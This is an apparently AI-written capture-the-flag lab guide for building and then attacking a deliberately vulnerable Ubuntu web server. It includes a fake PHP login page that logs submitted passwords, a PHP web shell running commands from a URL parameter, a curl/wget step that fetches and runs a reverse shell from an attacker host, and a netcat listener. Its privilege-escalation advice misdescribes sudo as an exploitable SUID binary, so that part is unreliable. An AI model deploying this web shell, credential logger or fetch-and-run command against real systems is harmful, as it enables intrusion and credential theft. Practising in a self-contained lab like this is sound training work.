# **💻 Advanced CTF Challenge: "Break the Vault"**
## **Scenario:**  
Your target is an Ubuntu server running a **misconfigured web service**. Your goal is to:  
✅ **Find the hidden user credentials**  
✅ **Gain a reverse shell**  
✅ **Escalate privileges to root**  
✅ **Capture the flag** (`root.txt`)

---

# **🛠 Setting Up the Challenge**
### **1️⃣ Launch an Ubuntu VM**
Make sure your **headless VM** is running. If you're using **AWS**, **Google Cloud**, or **VirtualBox**, ensure the **networking allows connections** (e.g., port 80, 22, and 4444 open).  

### **2️⃣ Install Required Packages**
Run these commands on the **target machine (Ubuntu VM)** to install the necessary tools:
```bash
sudo apt update && sudo apt install -y apache2 php netcat wget curl gcc
```
This installs:  
- **Apache** (web server)  
- **PHP** (to create a backdoor)  
- **Netcat** (for a reverse shell)  
- **GCC** (for privilege escalation)

---

# **📂 3️⃣ Create a Vulnerable Web Application**
### **Step 1: Start a Web Server**
```bash
sudo systemctl start apache2
```
Ensure it's running:
```bash
systemctl status apache2
```

### **Step 2: Add a Fake Login Page**
Create the following vulnerable **PHP page**:  
```bash
sudo nano /var/www/html/index.php
```
Paste this:
```php
<?php
if(isset($_POST['username']) && isset($_POST['password'])){
    $file = fopen("credentials.txt", "a");
    fwrite($file, $_POST['username'] . ":" . $_POST['password'] . "\n");
    fclose($file);
    echo "Login Failed! Try Again.";
}
?>
<!DOCTYPE html>
<html>
<body>
    <h2>Admin Login</h2>
    <form method="post">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit">
    </form>
</body>
</html>
```
This script **logs usernames and passwords to credentials.txt**.

### **Step 3: Create a Backdoor**
```bash
sudo nano /var/www/html/shell.php
```
Paste this:
```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```
This allows remote execution with:
```bash
curl "http://<target-ip>/shell.php?cmd=whoami"
```

### **Step 4: Restart Apache**
```bash
sudo systemctl restart apache2
```

---

# **💀 4️⃣ Exploiting the Target**
Now, from **your attacker machine** (your main system or Kali Linux), try these attacks:

### **Step 1: Discover Open Ports**
```bash
nmap -sV <target-ip>
```
Look for **port 80 (Apache)**.

### **Step 2: Try the Web Shell**
Visit:
```
http://<target-ip>/shell.php?cmd=whoami
```
Run:
```bash
curl "http://<target-ip>/shell.php?cmd=id"
```
This executes commands remotely.

### **Step 3: Upload a Reverse Shell**
Run:
```bash
curl "http://<target-ip>/shell.php?cmd=wget http://<attacker-ip>/rev.php -O /tmp/rev.php"
```
Then:
```
curl "http://<target-ip>/shell.php?cmd=php /tmp/rev.php"
```

### **Step 4: Catch the Reverse Shell**
On **your machine**, listen for the shell:
```bash
nc -lvnp 4444
```
If successful, you get a **remote shell**! 🎯

---

# **🔥 5️⃣ Privilege Escalation**
### **Step 1: Find SUID Binaries**
Run:
```bash
find / -perm -4000 2>/dev/null
```
Look for a **vulnerable binary** like `/usr/bin/sudo`.

### **Step 2: Exploit a SUID Binary**
If `find` shows:
```
/usr/bin/sudo
```
Try:
```bash
sudo su
```
You might become **root**! 🏆

---

# **🏁 6️⃣ Capture the Flag**
Check for a **root flag**:
```bash
cat /root/root.txt
```
If you see:
```
FLAG{you_have_root_access}
```
🎉 **Challenge completed!**

---

# **🔥 Bonus Challenges**
✅ **Brute-force credentials.txt**  
✅ **Find hidden files using `dirb`**  
✅ **Use Metasploit for automated exploitation**  

Would you like me to create a **write-up template** for your CTF practice? 🚀